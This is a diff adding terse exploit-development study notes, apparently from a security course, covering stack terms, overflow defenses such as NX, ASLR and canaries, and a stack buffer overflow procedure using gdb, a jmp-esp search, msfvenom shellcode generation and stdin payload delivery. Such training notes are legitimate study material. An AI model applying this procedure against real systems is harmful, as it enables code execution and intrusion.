@@ -291,7 +291,104 @@ REVERSE ENGINEERING:
  Patching:
      
 
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+EXPLOIT DEVELOPMENT:
+   Reverse engineering = binary analysis
+   HEAP/BUFFER Overflow
+   Stack operational common Terms:
+     HEAP
+     STACK
+     REGISTERS
+     IP
+     SP
+     BP
+     FUNCTION
+     SHELLCODE
+     
+   Buffer Overlow Defenses:
+     Non executable (NX) stack
+     Address Space Layout Randomization (ASLR)
+     Data Execution Preventions (DEP)
+     Stack Canaries
+     Position Independent Executable (PIE)
+     
+   
+   Segmentation fault (core dumped) = buffer overflowable
+   
+   ***DEMO:***
+        Do the process on machine where malware is found, but test on lin-ops!!!
+   gdb:
+      gdb <filename>              ### to load file
+          run                     ### runs the file
+        'pdisass main' to find 
+        pdisass <function>
+        
+        
+      default gdb
+      env - gdb <filename>                      (or "file<file>" in gdb to load)
+      show env
+      unset LINES/COLUMNS
+      info proc map             -> find /b <hex for start under heap>, <end hex above stack>, 0xff, 0xe4
+                                opcode for jmp = 0xff, esp = 0xe4
+      grab a bunch of hex from above find ^, paste in python script, comment out old eip. Split hex in two bytes ie - 0xf7 f6...
+      eip = "\xOO\xOO\XOO\xOO"  -in reverse of copied ^^
+      
+      ShellCode:
+        msfvenom -p linux/x86/exec CMD="/bin/whoami" -b "\x00" -f python
+                copy/paste buf
+        
+      Script is offset,ip,nop,buf order!!!
+        ./func <<< $(python /home/student/sec/buf_exploit.py)
 
+        
+        
+        
+   wiremask.eu
+       use Pattern in gdb, get EIP hex to get offset. Use python script
+        
+     run <<< $(python /home/student/sec/buf_exploit.py)                 ### use '<<<'when use rinput is req
+                                                                        ### do not use '<<<' when a parameter is req
+                                                                        
+
+     
+     
+        
+        
+        
+        
+        
+        
+        
+   Local (remote onto Linux):
+      
+   
+   
+   
+   
+   
+   
+  
+   Remote (Win):     
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
 
 
 
